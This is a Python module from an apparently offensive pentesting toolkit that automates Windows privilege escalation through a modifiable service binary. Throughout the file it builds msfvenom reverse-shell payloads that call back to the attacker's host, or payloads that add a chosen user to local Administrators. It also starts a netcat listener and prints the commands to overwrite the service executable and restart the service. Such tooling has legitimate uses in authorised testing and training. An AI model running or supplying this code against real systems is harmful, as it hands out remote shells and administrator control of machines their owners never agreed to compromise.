import shutil
import subprocess
from pathlib import Path, PureWindowsPath

from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost
from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

DEFAULT_SERVICE = "SecurityService"
DEFAULT_PATH = r"C:\Program Files (x86)\PCProtect\SecurityService.exe"


# ==========================================
# HELPERS
# ==========================================

def _header(service):

    print(f"\n{B}┌── MODULE: WEAK PERMISSIONS — MODIFIABLE SERVICE BINARY " + "─" * 3 + f"┐{W}")
    print(f"{B}│{W} SERVICE: {C}{service:<49}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question — safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = resolve_lhost(args=None, data=data)
    domain = data.get("domain")

    user = None

    try:
        user = get_active_cred(data).get("user")
    except Exception:
        pass

    return ip, domain, user


def _start_listener(port):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'nc -lvnp {port}; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started a Netcat listener on port {port} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start listener: {e}{W}")
        print(f"{Y}[!] Start one yourself: nc -lvnp {port}{W}")


def _msfvenom(args_list, outfile):

    if not shutil.which("msfvenom"):

        print(f"\n{Y}[!] msfvenom not found on this box — generate it manually:{W}")
        _cmd("msfvenom " + " ".join(args_list))

        return None

    print(f"\n{B}[*] Generating {outfile} with msfvenom...{W}")

    result = subprocess.run(
        ["msfvenom"] + args_list,
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not Path(outfile).is_file():

        print(f"{R}[-] msfvenom failed:{W}")
        print(result.stderr.strip())

        return None

    print(f"{G}[+] Generated {outfile}{W}")

    return Path(outfile)


def _generate_reverse_shell(lhost, lport, arch, outfile):

    return _msfvenom(
        [
            "-p", "windows/shell_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-a", arch,
            "--platform", "windows",
            "-f", "exe",
            "-o", outfile,
        ],
        outfile,
    )


def _generate_admin_add(user, arch, outfile):

    return _msfvenom(
        [
            "-p", "windows/exec",
            f"CMD=net localgroup administrators {user} /add",
            "-a", arch,
            "--platform", "windows",
            "-f", "exe",
            "-o", outfile,
        ],
        outfile,
    )


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, domain, default_user = _resolve_context()

    #
    # Accepts either `<service> <path>` (exact values, straight from the
    # analyzer's Run: line) or just `<path>` (manual invocation) — the
    # service name then defaults to the binary's own filename instead of
    # a hardcoded example, which was wrong for anything but this one box.
    #
    extra = list(args.extra) if hasattr(args, "extra") and args.extra else []

    service = None
    remote_path = None

    if len(extra) >= 2:
        service, remote_path = extra[0], extra[1]
    elif len(extra) == 1:
        remote_path = extra[0]

    if not remote_path:
        remote_path = input(
            f"\n{B}[?]{W} Full path to the service binary on target [{C}{DEFAULT_PATH}{W}]: "
        ).strip() or DEFAULT_PATH

    remote_path = remote_path.strip('"')

    #
    # PureWindowsPath, not Path — this tool runs on the attacker's Linux
    # box, and a plain Path wouldn't recognize backslash as a separator.
    #
    default_service = PureWindowsPath(remote_path).stem or DEFAULT_SERVICE

    if not service:
        service = input(
            f"\n{B}[?]{W} Service name [{C}{default_service}{W}]: "
        ).strip() or default_service

    print(f"\n{B}[*]{W} Not sure of the target binary's architecture? Run this on target first:")
    _cmd(
        f'$b=[IO.File]::ReadAllBytes("{remote_path}"); "{{0:X4}}" -f [BitConverter]::ToUInt16($b,[BitConverter]::ToInt32($b,0x3C)+4)',
        "# 014C = x86, 8664 = x64",
    )

    arch = input(f"\n{B}[?]{W} Target binary architecture, x86 or x64 [{C}x86{W}]: ").strip() or "x86"

    _header(service)

    payload_name = f"{service}.exe"

    _section("Choose payload")

    admin_add = _ask(
        "Add a user to local Administrators instead of a reverse shell? [y/N]: ",
        default_yes=False,
        optional=True,
    )

    if admin_add:

        #
        # Never let a bracketed placeholder become the literal value a
        # blank Enter silently accepts.
        #
        if default_user:
            new_admin = input(
                f"\n{B}[?]{W} Account to add to local Administrators [{C}{default_user}{W}]: "
            ).strip() or default_user
        else:
            new_admin = ""
            while not new_admin:
                new_admin = input(
                    f"\n{B}[?]{W} Account to add to local Administrators "
                    f"(no active credential on file — required): "
                ).strip()

        payload_path = _generate_admin_add(new_admin, arch, payload_name)

    else:

        lport = input(f"\n{B}[?]{W} Listener port [{C}4444{W}]: ").strip() or "4444"
        payload_path = _generate_reverse_shell(ip or "<ATTACKER-IP>", lport, arch, payload_name)

    if payload_path and _ask(f"Transfer {payload_name} to the target? [Y/n]: "):
        stage_windows_files([payload_path])

    if not admin_add and _ask(f"Start a Netcat listener on port {lport} now? [Y/n]: "):
        _start_listener(lport)

    _section("Execute on target")

    _step(
        1,
        f"Confirm the file ACL is actually writable by you",
        "BUILTIN\\Users or Everyone needs (F) or (M) — (RX) alone won't let you overwrite it.",
    )
    _cmd(f'icacls "{remote_path}"')

    _step(
        2,
        "Back up the original binary, then overwrite it with the payload",
        f"Payload should already be sitting in {DEFAULT_REMOTE_DIR} from the transfer step above.",
    )
    _cmd(
        f'copy "{remote_path}" "{remote_path}.bak"',
        f'cmd /c copy /Y {payload_name} "{remote_path}"',
    )

    _step(
        3,
        "(Re)start the service to trigger the payload",
        "If it's already running, stop it first — the SCM won't restart a service that's already up.",
    )
    _cmd(
        f'sc.exe stop {service}',
        f'sc.exe start {service}',
    )

    if admin_add:

        _step(4, "Confirm the account landed in Administrators")
        _cmd("net localgroup Administrators")

        _step(5, "Get a fresh session to actually use the new admin membership")

        runas_user = f"{domain}\\{new_admin}" if domain else new_admin
        _cmd(f"runas /user:{runas_user} powershell.exe")

        print()
        print(f"    {B}[*]{W} Your old session's token is stale — it won't reflect the new group until relogon.")

    else:

        print()
        print(f"    {B}[*]{W} Catch the shell on your listener — it runs in the service's context (check whoami).")

    _section("Cleanup (optional but recommended)")

    _step(6 if admin_add else 4, "Restore the original binary and restart the service")
    _cmd(
        f'cmd /c copy /Y "{remote_path}.bak" "{remote_path}"',
        f'sc.exe stop {service}',
        f'sc.exe start {service}',
    )
